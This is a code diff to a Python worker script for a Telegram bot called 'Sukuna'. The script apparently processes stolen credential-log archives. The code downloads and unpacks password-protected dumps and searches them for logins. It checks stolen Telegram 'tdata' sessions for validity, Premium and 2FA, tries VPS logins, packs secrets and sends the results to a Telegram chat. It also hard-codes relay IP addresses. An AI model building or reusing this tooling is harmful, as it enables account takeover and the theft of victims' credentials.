@@ -1,61 +1,21 @@
-
-import base64, glob, hashlib, json, multiprocessing, os, platform, queue, re, shutil, signal, socket, subprocess, sys, threading, time, zipfile
+import glob, json, multiprocessing, os, platform, queue, re, shutil, socket, subprocess, sys, threading, time, zipfile
 from concurrent.futures import ThreadPoolExecutor, ProcessPoolExecutor, as_completed
 from http.server import BaseHTTPRequestHandler, ThreadingHTTPServer
 from pathlib import Path
-from urllib.parse import urlsplit, urlunsplit
 import requests
 
 VM_LIFE  = int(3360)                     # lifetime cap advertised on the card
-# The task payload may arrive encrypted (the bot encrypts it with the
-# RUNNER_TASK_KEY, the workflow decrypts it with the repo secret of the same
-# name). An encrypted task keeps the download links and the chat id out of a
-# public repository's workflow inputs.
+# Single source of truth: the bot's token travels inside the task payload
+# (injected by the bot from CONFIG/settings.py). No repo secret involved.
 _TASK_   = {}
-_RAW     = os.environ.get("TASK") or ""
-_KEY     = os.environ.get("TASK_KEY") or ""
-
-
-def _unseal(raw, key):
-    """XOR-CTR with a SHA-256 keystream; the same scheme the bot uses."""
-    if not raw.startswith("ENC1:") or not key:
-        return raw
-    import base64
-    try:
-        data = base64.b64decode(raw[5:])
-    except Exception:
-        return raw
-    ks = bytearray()
-    ctr = 0
-    k = key.encode()
-    while len(ks) < len(data):
-        ks += hashlib.sha256(k + ctr.to_bytes(8, "big")).digest()
-        ctr += 1
-    plain = bytes(a ^ b for a, b in zip(data, bytes(ks[:len(data)])))
-    try:
-        return plain.decode("utf-8", "ignore")
-    except Exception:
-        return raw
-
-
 try:
-    _TASK_ = json.loads(_unseal(_RAW, _KEY) or "{}")
-except Exception as e:
-    # Never swallow this: without the task the runner has nothing to do and
-    # the job would just sit there.
-    sys.stdout.write("task unseal failed: %s (raw=%d bytes, key=%d bytes)\n"
-                     % (e, len(_RAW), len(_KEY)))
-    sys.stdout.flush()
+    _TASK_ = json.loads(os.environ.get("TASK") or "{}")
+except Exception:
     _TASK_ = {}
-# The bot token comes from the task payload when it is there, and from the
-# repository secret otherwise. The payload is sealed (ENC1:) with the
-# RUNNER_TASK_KEY, so the token does not land in the public run history in
-# the clear - and unlike a secret it is refreshed with the payload, so a
-# rotated token cannot leave the runner publishing into the void.
-TG       = str(_TASK_.get("tg_token") or "") or (os.environ.get("BOT_TOKEN") or "")
+TG       = str(_TASK_.get("tg_token") or "")
 TG_API   = "https://api.telegram.org/bot" + TG + "/"
 CHAT     = None
-PB       = [0.0, None, None, 0, None]  # [last publish, card message id, job t0, publish count, last stage]
+PB       = [0.0, None, None, 0]  # [last publish, card message id, job t0, publish count]
 WORK  = Path("/tmp/job")
 OUT   = Path("/tmp/out")
 PROG  = OUT / "progress.json"
@@ -65,47 +25,21 @@ DOMS  = []
 _state = {"stage": "boot", "pct": 0, "err": None, "cores": CORES, "job": None}
 _flush = [0.0]
 
-RULE   = "━━━━━━━━━━━━━━━━━━━━━━━━━━━━"
-THIN   = "┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄"
-STAGE_ICON = {
-    "boot": "🟡", "idle": "🟢", "installing": "🧩", "download": "📥", "downloaded": "✅",
-    "batch_download": "📥",
-    "extract": "📦", "extracted": "✅", "wrong_password": "🔑", "scan": "🔍",
-    "authcheck": "🔎", "tdatacheck": "🗂",
-    "vps_probe": "🌐", "vps_login": "🔐", "vps_pack": "📤",
-    "packed": "🗃", "done": "🏁", "error": "❌", "cancelled": "🛑", "cancelling": "🛑",
-    "queued": "⏳", "retired": "♻️", "ttl_expired": "♻️",
-}
-HEADER_MARK = "◆"
+RULE   = "━━━━━━━━━━━━━━━━━━━━━━━━━━"
+THIN   = "┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄"
+STAGE_ICON = {'boot': '🟡', 'idle': '🟢', 'installing': '🧩', 'download': '📥', 'downloaded': '✅', 'extract': '📦', 'extracted': '✅', 'wrong_password': '🔑', 'scan': '🔍', 'authcheck': '🔎', 'tdatacheck': '🗂', 'vps_probe': '🌐', 'vps_login': '🔐', 'vps_pack': '📤', 'packed': '🗃', 'done': '🏁', 'error': '❌', 'cancelled': '🛑', 'cancelling': '🛑', 'queued': '⏳', 'retired': '♻️', 'ttl_expired': '♻️'}
+HEADER_MARK = '◆'
 BAR_WIDTH = 10
-BAR_FULL = "█"
-BAR_EMPTY = "░"
+BAR_FULL = '█'
+BAR_EMPTY = '░'
 USE_BLOCKQUOTES = True
 EXPAND_LONG_HELP = True
-BOT_NAME = "Sukuna"
+BOT_NAME = 'Sukuna'
 VM_TTL = 3600
 class _Ref:
-    ref = "github-runner"
+    ref = 'rojaskomar67-ops/cookiebot-vm'
     born = time.time()
 vm = _Ref()
-
-def handle_cancel(sig, frame):
-    try:
-        if CHAT and PB[1]:
-            text = f"{HEADER_MARK} <b>CANCELLED</b>  ·  LOG SEARCH\n{RULE}\n🛑 <b>Job force-cancelled by operator.</b>\n🖥 <b>Job stopped.</b>"
-            requests.post(TG_API + "editMessageText", timeout=4, json={
-                "chat_id": CHAT, "message_id": PB[1], "text": text, "parse_mode": "HTML"
-            })
-    except Exception:
-        pass
-    sys.exit(0)
-
-try:
-    signal.signal(signal.SIGINT, handle_cancel)
-    signal.signal(signal.SIGTERM, handle_cancel)
-except Exception:
-    pass
-
 def bq(text: str, expand: bool = False) -> str:
     """Telegram block quote (optionally expandable) — clean, modern banner style."""
     if not USE_BLOCKQUOTES:
@@ -247,34 +181,18 @@ def stage_panel(p: dict) -> str:
                      f"💀 {code(p.get('tk_dead', 0))} dead   ⏳ {code(p.get('tk_err', 0))} retrying"
                      f"   🌍 {code(p.get('tk_proxies', 0))} proxies")
 
-    if stage == "batch_download":
-        lines.append(f"📂 {bold('Files')}   {code('%d/%d' % (p.get('files_done', 0), p.get('files_total', 0)))} loaded"
-                     f"   💾 {code(p.get('total', '?'))}")
-        lines.append(f"📥 {code(p.get('got', '0 B'))} / {code(p.get('total', '?'))}"
-                     f"   ⚡ {code(p.get('speed', '-'))}   ⏱ {code(p.get('elapsed', '-'))}")
-        if p.get("file"):
-            lines.append(f"🏷 {code(p['file'])}")
-        if p.get("note"):
-            lines.append(f"⏳ {code(p['note'])}")
-    elif p.get("batch_total"):
-        lines.append(f"📂 {bold('Batch')}   {code(p.get('batch_files', '-'))} files loaded"
-                     f"   💾 {code(p.get('batch_total'))}")
-
     if stage == "error" and p.get("err"):
         lines.append(f"⚠️ {bold('Error')}: {code(p.get('err'))}")
     return "\n".join(lines)
+
 def live_text(job) -> str:
     p = job.get("prog") or {}
-    kind = p.get("kind") or ""
-    vps_kind = kind.startswith("vps")
+    vps_kind = (p.get("kind") or "").startswith("vps")
     wall = fmt_time(time.time() - job["t0"])
     jid = job["id"]
-    if kind == "batch":
-        head = gold_header('BATCH ENGINE', 'Batch · %s' % (p.get("mode") or "-"))
-    elif vps_kind:
-        head = gold_header('VPS SCAN', 'Live Console')
-    else:
-        head = gold_header('LOG SEARCH', 'Live Console')
+    head = (gold_header('VPS SCAN', 'Live Console')
+            if vps_kind else
+            gold_header('LOG SEARCH', 'Live Console'))
     return (f"{head}\n"
             f"{THIN}\n"
             f"{stage_panel(p)}\n"
@@ -284,6 +202,7 @@ def live_text(job) -> str:
             f"⏳ {bold('Wall time')} {code(wall)}   🆔 {code(jid)}\n"
             f"🛑 Cancel: {code('/cancel ' + jid)}")
 
+
 def job_ctx():
     return {"prog": _state, "t0": PB[2] or time.time(), "id": _state.get("job") or "-"}
 
@@ -292,22 +211,18 @@ def pub(force=False):
     if not CHAT or not PB[1]:
         return
     n = time.time()
-    cur_stage = _state.get("stage")
-    stage_changed = (len(PB) > 4 and cur_stage != PB[4])
-    hot = force or stage_changed or cur_stage in ("done", "error", "cancelled",
-                                                  "wrong_password", "idle", "retired")
+    hot = force and _state.get("stage") in ("done", "error", "cancelled",
+                                            "wrong_password", "idle", "retired")
     if n - PB[0] < (0.5 if hot else 2.5):
         return
     PB[0] = n
-    if len(PB) > 4:
-        PB[4] = cur_stage
     try:
-        r = tg_post(TG_API + "editMessageText", tries=3, timeout=30, json={
+        r = requests.post(TG_API + "editMessageText", timeout=30, json={
             "chat_id": CHAT, "message_id": PB[1], "text": live_text(job_ctx()),
             "parse_mode": "HTML"})
-        if r is not None and getattr(r, "status_code", 0) == 200:
+        if r.status_code == 200:
             PB[3] += 1
-        elif r is not None and "message is not modified" not in (getattr(r, "text", "") or ""):
+        elif "message is not modified" not in (r.text or ""):
             sys.stdout.write("tg edit %s: %s\n" % (r.status_code, r.text[:150])); sys.stdout.flush()
     except Exception as e:
         sys.stdout.write("tg edit failed: %s\n" % e); sys.stdout.flush()
@@ -317,14 +232,9 @@ def new_card(text):
     if not CHAT:
         return None
     try:
-        r = tg_post(TG_API + "sendMessage", timeout=30, json={
+        r = requests.post(TG_API + "sendMessage", timeout=30, json={
             "chat_id": CHAT, "text": text, "parse_mode": "HTML"})
-        if r is None:
-            return None
-        try:
-            return (r.json().get("result") or {}).get("message_id")
-        except Exception:
-            return None
+        return (r.json().get("result") or {}).get("message_id")
     except Exception as e:
         sys.stdout.write("tg send failed: %s\n" % e); sys.stdout.flush()
         return None
@@ -338,65 +248,19 @@ def report(payload, tries=1):
 def upload(name, caption):
     """Send a result file straight from the VM to the user's chat."""
     if not TG or not CHAT: return False
-    last = None
-    for attempt in range(6):
-        try:
-            with open(name, "rb") as fh:
-                # requests cannot mix json= and files=: the fields must travel as multipart data.
-                r = tg_post(TG_API + "sendDocument", tries=1,
-                            data={"chat_id": CHAT, "caption": caption,
-                                  "parse_mode": "HTML"},
-                            files={"document": (name.split("/")[-1], fh)}, timeout=300)
-            if r is not None and r.status_code == 200:
-                return True
-            last = r
-            sys.stdout.write("tg send %s: %s (attempt %d/6)\n"
-                             % (name, getattr(r, "text", r)[:200], attempt + 1))
-            sys.stdout.flush()
-        except Exception as e:
-            last = e
-            sys.stdout.write("tg send error: %s (attempt %d/6)\n" % (e, attempt + 1))
-            sys.stdout.flush()
-        time.sleep(min(5 * (attempt + 1), 30))
-    return False
-
-def tg_post(url, tries=5, **kw):
-    """POST to the Bot API and retry the failures that are not our fault.
-
-    The API answers 502 or simply times out when Telegram's edge for the
-    runner's address wobbles. A result file must never be lost because of
-    that, so every call is retried with a growing delay."""
-    delay = 4
-    last = None
-    for attempt in range(tries):
-        try:
-            r = requests.post(url, **kw)
-            if r.status_code == 200:
-                return r
-            last = r
-            if r.status_code in (429, 500, 502, 503, 504):
-                sys.stdout.write("tg api %s: %s (retry %d/%d)\n"
-                                 % (url.rsplit("/", 1)[-1], r.text[:140], attempt + 1, tries))
-                sys.stdout.flush()
-                wait = delay
-                try:
-                    ra = int(((r.json() or {}).get("parameters") or {}).get("retry_after") or 0)
-                    if ra:
-                        wait = min(max(ra, delay), 60)
-                except Exception:
-                    pass
-                time.sleep(wait)
-                delay = min(delay * 2, 30)
-                continue
-            return r
-        except Exception as e:
-            last = e
-            sys.stdout.write("tg api error: %s (retry %d/%d)\n" % (e, attempt + 1, tries))
-            sys.stdout.flush()
-            time.sleep(delay)
-            delay = min(delay * 2, 30)
-    return last
-
+    try:
+        with open(name, "rb") as fh:
+            # requests cannot mix json= and files=: the fields must travel as multipart data.
+            r = requests.post(TG_API + "sendDocument",
+                              data={"chat_id": CHAT, "caption": caption,
+                                    "parse_mode": "HTML"},
+                              files={"document": (name.split("/")[-1], fh)}, timeout=300)
+        if r.status_code != 200:
+            sys.stdout.write("tg send %s: %s\n" % (name, r.text[:200])); sys.stdout.flush()
+        return r.status_code == 200
+    except Exception as e:
+        sys.stdout.write("tg send error: %s\n" % e); sys.stdout.flush()
+        return False
 
 def ft(s):
     s = int(max(0, s or 0))
@@ -586,23 +450,7 @@ def resolve(url):
     handed to aria2c untouched. /info matters — plain /api/file/<id> IS the file."""
     host = pd_host(url)
     if host not in PD_HOSTS + PD_PROXIES:
-        fname, fsize = None, 0
-        resolved_url = url
-        try:
-            hr = requests.head(url, allow_redirects=True, timeout=10,
-                               headers={"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64)"})
-            if hr.status_code < 400:
-                resolved_url = hr.url or url
-                cd = hr.headers.get("Content-Disposition") or ""
-                m = re.search(r'filename\*?=(?:UTF-8\'\')?"?([^";]+)"?', cd)
-                if m:
-                    fname = os.path.basename(m.group(1).strip().replace('"', ''))
-                cl = hr.headers.get("Content-Length")
-                if cl and cl.isdigit():
-                    fsize = int(cl)
-        except Exception:
-            pass
-        return resolved_url, fname, fsize, None
+        return url, None, 0, None
     kind, pid, item, err = pd_parts(url, host)
     if err:
         return None, None, 0, err
@@ -657,59 +505,14 @@ def download(url):
     if not shutil.which("aria2c"):
         st("installing", 3); apt(["aria2", "p7zip-full", "unrar-free"])
     use_aria = shutil.which("aria2c") is not None
-    is_internal = ("/dl/" in url) or ("trycloudflare.com" in url) or ("107.149.158.183" in url) or ("5.9.215.99" in url)
-    # Relay links travel through the tunnel, and the edge throttles every
-    # connection on its own: four connections cap the whole transfer at a
-    # few MB/s. Many connections are what buys the bandwidth here.
-    #
-    # The number of connections is the single biggest lever on a relay
-    # download: each connection is an independent range request and the edge
-    # meters them one by one. RELAY_SPLITS overrides it when a host is
-    # tight on sockets or the relay runs out of session slots.
-    try:
-        split_count = int(os.environ.get("RELAY_SPLITS") or "")
-    except Exception:
-        split_count = 0
-    if split_count <= 0:
-        # The split count is the single biggest lever on a relay download,
-        # and it is NOT "more is better". Measured on the production relay
-        # (direct origin, 12 accounts x 3 connections, 36 sessions, 100 MB
-        # over N parallel range requests):
-        #
-        #   N=1  28.5 MB/s (228 Mbps)
-        #   N=4  64.4 MB/s (515 Mbps)
-        #   N=8  70.0 MB/s (560 Mbps)   <- the peak
-        #   N=12 56.1 MB/s
-        #   N=16 45.1 MB/s
-        #   N=24 20.4 MB/s
-        #   N=32 31.9 MB/s
-        #   N=64 21.9 MB/s
-        #
-        # Past ~8 connections the relay stops scaling and then goes
-        # backwards: every connection holds a chunk slot while its chunk is
-        # written downstream, the per-request streams collide with the
-        # session request cap, and head-of-line blocking inside each request
-        # starts stalling the others. The old default of 96 splits sat deep
-        # in the collapse - it was tuned when the Cloudflare tunnel was the
-        # bottleneck and one connection was pathologically slow.
-        split_count = 8 if is_internal else 16
-    engine_name = "aria2c (%d-stream falloc)" % split_count if use_aria else "fast-parallel"
-    st("download", 4, engine=engine_name, file=fname, size=fsize)
+    st("download", 4, engine="aria2c (16 chunks)" if use_aria else "requests")
     t0 = time.time()
     found = None
     if use_aria:
-        cmd = [ "aria2c", "--dir", str(dest), f"--split={split_count}", f"--max-connection-per-server={split_count}",
-                "--file-allocation=falloc",
-                "--disk-cache=64M", "--socket-recv-buffer-size=4M",
-                "--min-split-size=256K",
-                "--stream-piece-selector=default", "--piece-length=1M",
-                "--optimize-concurrent-downloads=true", "--auto-file-renaming=false",
+        cmd = [ "aria2c", "--dir", str(dest), "--split=16", "--max-connection-per-server=16",
+                "--min-split-size=1M", "--file-allocation=none", "--auto-file-renaming=false",
                 "--allow-overwrite=true", "--console-log-level=warn", "--summary-interval=1",
-                "--max-tries=10", "--retry-wait=2",
-                "--user-agent=Mozilla/5.0 (Windows NT 10.0; Win64; x64)",
-                "--header=Accept: */*" ]
-        if shutil.which("stdbuf"):
-            cmd = ["stdbuf", "-oL", "-eL"] + cmd
+                "--user-agent=Mozilla/5.0" ]
         if fname:
             cmd += ["--out", fname]
         cmd.append(url)
@@ -718,7 +521,6 @@ def download(url):
         pe = re.compile(r"\[#\w+\s+([\d.]+\w+)/([\d.]+\w+)\((\d+)%\)")
         se = re.compile(r"DL:([\d.]+\w+)")
         tail = []
-        last_dl_tick = 0.0
         for raw in pr.stdout:
             if stop():
                 pr.terminate(); return None
@@ -727,35 +529,21 @@ def download(url):
             m = pe.search(raw)
             if m:
                 s = se.search(raw)
-                pct_dl = 4 + int(m.group(3)) * 0.26
-                now_t = time.time()
-                if (pct_dl - _state.get("pct", 0) >= 3) or (now_t - last_dl_tick >= 2.5):
-                    last_dl_tick = now_t
-                    st("download", pct_dl, got=m.group(1),
-                       total=m.group(2) if fsize == 0 else fs(fsize),
-                       speed=(s.group(1) + "/s") if s else "-", elapsed=ft(now_t - t0),
-                       file=fname, size=fsize)
+                st("download", 4 + int(m.group(3)) * 0.26, got=m.group(1), total=m.group(2),
+                   speed=(s.group(1) + "/s") if s else "-", elapsed=ft(time.time() - t0))
             fm = re.search(r"Download complete:\s*(.+)", raw)
             if fm: found = fm.group(1).strip()
         pr.wait()
-        if fname and (dest / fname).is_file():
-            found = str(dest / fname)
         if pr.returncode not in (0, None):
-            sys.stdout.write("ARIA2 FAIL rc=%s, activating fast parallel engine\n" % pr.returncode)
+            sys.stdout.write("ARIA2 FAIL rc=%s\n%s\n" % (pr.returncode, "\n".join(tail)))
             sys.stdout.flush()
-            found = fast_parallel_dl(url, dest, fname, fsize, t0)
-            if not found:
-                # The fallback could not complete the file either. The file
-                # aria2c left behind has the right length but holes in it, so
-                # it must not reach the scanner.
-                for stale in (dest / fname,) if fname else ():
-                    try:
-                        stale.unlink(missing_ok=True)
-                    except Exception:
-                        pass
-                return None
+            st("error", err="download_failed(rc=%s) %s" %
+               (pr.returncode, " ".join(tail[-3:])[:150]))
+            return None
     else:
-        found = fast_parallel_dl(url, dest, fname, fsize, t0)
+        found = slow_dl(url, dest, t0, fname)
+        if found is None:
+            st("error", err=_state.get("err") or "download_failed"); return None
     if not found or not os.path.isfile(found):
         cand = []
         for e in ("*.zip", "*.rar", "*.7z", "*.ZIP", "*.RAR"):
@@ -773,254 +561,22 @@ def download(url):
        dl_time=ft(time.time() - t0))
     return Path(found)
 
-# How many files are being pulled at the same time right now. The connection
-# count of a relay download is per file, so the total in flight is
-# files x splits: that total has to stay inside both the edge's connection
-# cap and the relay's chunk-slot budget, otherwise the connections that do
-# get through end up waiting for a slot and the transfer stalls.
-_PARALLEL_FILES = 1
-
-# Total number of concurrent range requests a relay download may have open.
-# Measured on the production relay: 4 connections give 64 MB/s, 8 give
-# 70 MB/s, 12 give 56, 16 give 45 and 24 collapse to 20 MB/s. Eight is the
-# peak; everything above it costs throughput instead of buying it.
-_RELAY_CONN_BUDGET = 8
-
-
-def fast_parallel_dl(url, dest, fname=None, fsize=0, t0=None, progress_cb=None):
-    """High-throughput multi-connection parallel segment downloader using atomic
-    posix_fallocate + direct os.pwrite without seeking or locking races.
-
-    progress_cb, when given, receives the number of bytes that were just
-    written. The batch downloader uses it to publish one aggregate progress
-    line for the whole set instead of one line per file."""
-    import urllib.request, concurrent.futures
-    t0 = t0 or time.time()
-    dest = Path(dest)
-    dest.mkdir(parents=True, exist_ok=True)
-
-    total_size = fsize or 0
-    range_supported = False
-    final_url = url
-    try:
-        probe_req = urllib.request.Request(url, headers={
-            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64)',
-            'Range': 'bytes=0-0'
-        })
-        with urllib.request.urlopen(probe_req, timeout=15) as resp:
-            final_url = resp.geturl() or url
-            cr = resp.headers.get('Content-Range')
-            if cr and '/' in cr:
-                try: total_size = int(cr.split('/')[-1])
-                except Exception: pass
-                range_supported = True
-            elif resp.headers.get('Accept-Ranges') == 'bytes':
-                range_supported = True
-            if not total_size:
-                try: total_size = int(resp.headers.get('Content-Length') or 0)
-                except Exception: pass
-    except Exception:
-        pass
-
-    out_name = fname
-    if not out_name:
-        import urllib.parse
-        clean_path = urllib.parse.unquote(url.split('?')[0].rstrip('/').split('/')[-1])
-        out_name = clean_path if re.search(r'\.(zip|rar|7z|tar|gz)$', clean_path, re.I) else 'archive.bin'
-
-    tgt = dest / out_name
-    fd = os.open(str(tgt), os.O_RDWR | os.O_CREAT | os.O_TRUNC)
-
-    if total_size > 0:
-        try: os.posix_fallocate(fd, 0, total_size)
-        except Exception:
-            try: os.ftruncate(fd, total_size)
-            except Exception: pass
-
-    if range_supported and total_size > (4 * 1024 * 1024):
-        is_internal = ("/dl/" in final_url) or ("trycloudflare.com" in final_url) or ("107.149.158.183" in final_url) or ("5.9.215.99" in final_url)
-        # Internal (relay) links: many parallel connections. When the edge
-        # in front of the relay throttles per connection, the number of
-        # connections is what decides the total speed. The edge also caps
-        # how many connections it will carry at once, so the total (files
-        # in parallel x connections per file) has to stay below that.
-        try:
-            workers = int(os.environ.get("RELAY_SPLITS") or "")
-        except Exception:
-            workers = 0
-        if workers <= 0:
-            if is_internal:
-                # The connection count is a *total* budget, not a per-file
-                # one: the relay's peak throughput is at ~8 concurrent range
-                # requests in total (see the measurement above), and it
-                # degrades sharply beyond that. Five files at 96 splits each
-                # is 480 connections in the worst case - deep in the
-                # collapse. Divide the budget between the files in flight.
-                par = max(1, int(_PARALLEL_FILES))
-                workers = max(2, _RELAY_CONN_BUDGET // par)
-            else:
-                workers = min(16, max(4, (os.cpu_count() or 4) * 2))
-        # The segment size is independent of the number of connections.
-        #
-        # One segment per connection (file_size / connections) is the fastest
-        # shape: the relay pipelines the chunks of a request and keeps the
-        # connection busy, and a connection is only opened once. Smaller
-        # segments mean more requests and more per-request overhead, and the
-        # measured aggregate drops with it - 8 MB segments moved 2.32 GB in
-        # the first twelve minutes where 125 MB segments moved 5.81 GB.
-        #
-        # The queue is kept regardless, so a connection that finishes early
-        # picks up the next segment instead of idling.
-        try:
-            seg_mb = int(os.environ.get("RELAY_SEGMENT_MB") or "")
-        except Exception:
-            seg_mb = 0
-        if seg_mb > 0:
-            seg_size = seg_mb * 1024 * 1024
-        else:
-            seg_size = max(1, total_size // workers)
-        downloaded = [0]
-        lock = threading.Lock()
-        last_tick = [time.time()]
-        last_done = [0.0]
-
-        # The segments every connection works through, in order.
-        seg_queue = queue.Queue()
-        off = 0
-        while off < total_size:
-            seg_end = min(off + seg_size, total_size) - 1
-            seg_queue.put((off, seg_end))
-            off = seg_end + 1
-        seg_total = seg_queue.qsize()
-
-        def fetch_segment(w_idx, start, end):
-            """Fetch one segment, resuming from where it stopped.
-
-            A segment that ends early must never be silently accepted: the
-            file is preallocated to its full length, so the bytes that were
-            never written stay as zeros and the scan that follows sees a
-            file with holes in it. Every early end is therefore retried from
-            the last byte that actually arrived, and the segment is only
-            complete when the last byte is there.
-            """
-            curr = start
-            attempts = 0
-            while curr <= end:
-                attempts += 1
-                if attempts > 20:
-                    break
-                if stop(): return False
-                try:
-                    w_req = urllib.request.Request(final_url, headers={
-                        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64)',
-                        'Range': f'bytes={curr}-{end}',
-                        'Accept': '*/*'
-                    })
-                    with urllib.request.urlopen(w_req, timeout=180) as r:
-                        while curr <= end:
-                            if stop(): return False
-                            chunk = r.read(1024 * 1024)
-                            if not chunk:
-                                # The stream ended early. Break out and retry
-                                # from the last byte that arrived.
-                                break
-                            os.pwrite(fd, chunk, curr)
-                            curr += len(chunk)
-                            with lock:
-                                downloaded[0] += len(chunk)
-                                done = downloaded[0]
-                                if progress_cb is not None:
-                                    progress_cb(len(chunk))
-                                    continue
-                                now_t = time.time()
-                                if now_t - last_tick[0] >= 2.0:
-                                    # Rate over the last tick, not since the
-                                    # start: a cumulative average reads far
-                                    # below the speed the link is running at.
-                                    spd = fs((done - last_done[0]) / (now_t - last_tick[0])) + "/s" \
-                                        if now_t > last_tick[0] else "-"
-                                    last_done[0] = done
-                                    last_tick[0] = now_t
-                                    pct_dl = 4 + int(done * 26 // total_size)
-                                    el = now_t - t0
-                                    st("download", pct_dl, got=fs(done),
-                                       total=fs(total_size), speed=spd,
-                                       elapsed=ft(el), file=out_name, size=total_size)
-                except Exception:
-                    pass
-                # Either the stream ended early or the request failed: the
-                # segment is incomplete, so resume it from where it stopped.
-                time.sleep(min(0.5 * attempts, 5))
-            return curr > end
-
-        def worker_loop(w_idx):
-            """One connection works through the segments until they are gone."""
-            bad = 0
-            while True:
-                try:
-                    start, end = seg_queue.get_nowait()
-                except queue.Empty:
-                    return bad == 0
-                if not fetch_segment(w_idx, start, end):
-                    bad += 1
-                seg_queue.task_done()
-
-        with concurrent.futures.ThreadPoolExecutor(max_workers=workers) as ex:
-            futs = [ex.submit(worker_loop, i) for i in range(workers)]
-            incomplete = []
-            for f in concurrent.futures.as_completed(futs):
-                if stop():
-                    os.close(fd); return None
-                try:
-                    if not f.result():
-                        incomplete.append(1)
-                except Exception:
-                    incomplete.append(1)
-            if incomplete:
-                # The file is the right size on disk but parts of it were
-                # never written. Scanning it would report panels that are
-                # simply not in the dump, so the download is a failure.
-                sys.stdout.write("INCOMPLETE DOWNLOAD: %d of %d connections did not "
-                                 "finish (%d of %d bytes written, %d segments)\n"
-                                 % (len(incomplete), workers, downloaded[0], total_size, seg_total))
-                sys.stdout.flush()
-                os.close(fd)
-                return None
-    else:
-        # High-speed buffered stream fallback (2MB buffer)
-        req = urllib.request.Request(final_url, headers={'User-Agent': 'Mozilla/5.0'})
-        written = 0
-        with urllib.request.urlopen(req, timeout=900) as r:
-            curr = 0
-            last_tick = time.time()
-            while True:
-                if stop():
-                    os.close(fd); return None
-                chunk = r.read(2 * 1024 * 1024)
-                if not chunk: break
-                os.write(fd, chunk)
-                curr += len(chunk)
-                written += len(chunk)
-                if progress_cb is not None:
-                    progress_cb(len(chunk))
-                    continue
-                now_t = time.time()
-                if now_t - last_tick >= 2.0:
-                    last_tick = now_t
-                    pct_dl = 4 + (curr * 26 // total_size if total_size else 0)
-                    el = now_t - t0
-                    spd = fs(curr / el) + "/s" if el > 0 else "-"
-                    st("download", pct_dl, got=fs(curr),
-                       total=fs(total_size) if total_size else "?", speed=spd,
-                       elapsed=ft(el), file=out_name, size=total_size)
-        if total_size and written != total_size:
-            sys.stdout.write("INCOMPLETE DOWNLOAD: %d of %d bytes written\n"
-                             % (written, total_size))
-            sys.stdout.flush()
-            os.close(fd)
-            return None
-
-    os.close(fd)
+def slow_dl(url, dest, t0, name=None):
+    import requests
+    from urllib.parse import unquote
+    nm = name or unquote(url.split("?")[0].rstrip("/").split("/")[-1])
+    if not re.search(r"\.(zip|rar|7z)$", nm, re.I): nm = "archive.zip"
+    tgt = dest / nm
+    with requests.get(url, stream=True, timeout=900,
+                      headers={"User-Agent": "Mozilla/5.0"}) as r:
+        r.raise_for_status()
+        tot = int(r.headers.get("content-length") or 0); done = 0
+        with open(tgt, "wb") as f:
+            for ch in r.iter_content(1 << 20):
+                if stop(): return None
+                f.write(ch); done += len(ch)
+                st("download", 4 + (done * 26 // tot if tot else 0), got=fs(done),
+                   total=fs(tot) if tot else "?", elapsed=ft(time.time() - t0))
     return str(tgt)
 
 # ── 2. extract (all cores; tries every supplied password, never re-downloads) ──
@@ -1407,27 +963,21 @@ def deliver_auth(auths):
                       f"archive, so the bot-side proxy check is skipped for this job")
         sent_parts, _ = ship(zp, auth_cap)
         return sent_parts > 0, None
-    last = None
-    for attempt in range(5):
-        try:
-            with open(zp, "rb") as fh:
-                r = tg_post(TG_API + "sendDocument", tries=1,
-                            data={"chat_id": CHAT, "caption": cap,
-                                  "parse_mode": "HTML"},
-                            files={"document": (zp.name, fh)}, timeout=300)
-            if r is not None and r.status_code == 200:
-                fid = (((r.json().get("result") or {}).get("document") or {})
-                       .get("file_id"))
-                return True, fid
-            last = r
-            sys.stdout.write("tg send %s: %s (attempt %d/5)\n"
-                             % (zp.name, getattr(r, "text", r)[:200], attempt + 1))
-            sys.stdout.flush()
-        except Exception as e:
-            last = e
-            sys.stdout.write("tg send error: %s (attempt %d/5)\n" % (e, attempt + 1))
-            sys.stdout.flush()
-        time.sleep(min(5 * (attempt + 1), 25))
+    try:
+        with open(zp, "rb") as fh:
+            r = requests.post(TG_API + "sendDocument",
+                              data={"chat_id": CHAT, "caption": cap,
+                                    "parse_mode": "HTML"},
+                              files={"document": (zp.name, fh)}, timeout=300)
+        if r.status_code == 200:
+            fid = (((r.json().get("result") or {}).get("document") or {})
+                   .get("file_id"))
+            return True, fid
+        sys.stdout.write("tg send %s: %s\n" % (zp.name, r.text[:200]))
+        sys.stdout.flush()
+        return False, None
+    except Exception as e:
+        sys.stdout.write("tg send error: %s\n" % e); sys.stdout.flush()
         return False, None
 
 # ── auth.json proxy check (did the user request it in step 4?) ─────────────
@@ -1869,8 +1419,8 @@ def check_tdata(tdirs):
         pend = [r for r in res if r["status"] == "err"]
         v = [r for r in done if r["status"] == "valid"]
         pct_v = (len(done) * 100 // max(len(res), 1)) if res else 100
-        sub = esc('%d / %d folders' % (len(done), len(res)))
-        txt = (f"{gold_header('TDATA CHECKING', sub)}\n{THIN}\n"
+        txt = (f"{gold_header('TDATA CHECKING', esc('%d / %d folders' %
+               (len(done), len(res))))}\n{THIN}\n"
                f"{bar(pct_v)}\n"
                f"✅ {bold('Valid')}  {code(len(v))}  ·  ★ {bold('Premium')}  "
                f"{code(sum(1 for r in v if r['prem']))}  ·  🔒 {bold('2FA')}  "
@@ -2275,91 +1825,6 @@ def pack_secrets(files):
 
 def finish(task, stage, **extra):
     """Terminal state for a job: paint the card, report to the bot, back to idle."""
-    if stage == "done":
-        # 1. The live console card stays in the chat. It used to be deleted
-        #    here, so the whole run vanished the instant it finished. The card
-        #    keeps the final console state (painted below by st()) and the
-        #    summary goes out as its own message.
-        if CHAT and PB[1]:
-            sys.stdout.write("Live card %s kept in chat\n" % (PB[1],))
-            sys.stdout.flush()
-
-        # 2. Send Task Complete ✅
-        if CHAT:
-            try:
-                tot_elapsed = ft(time.time() - (PB[2] or time.time()))
-                is_vps = task.get("kind") in ("vps_promox", "vps_check")
-                is_batch = task.get("kind") == "batch"
-                if is_batch:
-                    mode = task.get("mode") or "-"
-                    lines = [
-                        "✦ <b>Task Complete ✅</b>",
-                        "━━━━━━━━━━━━━━━━━━━━━━━━━━━━",
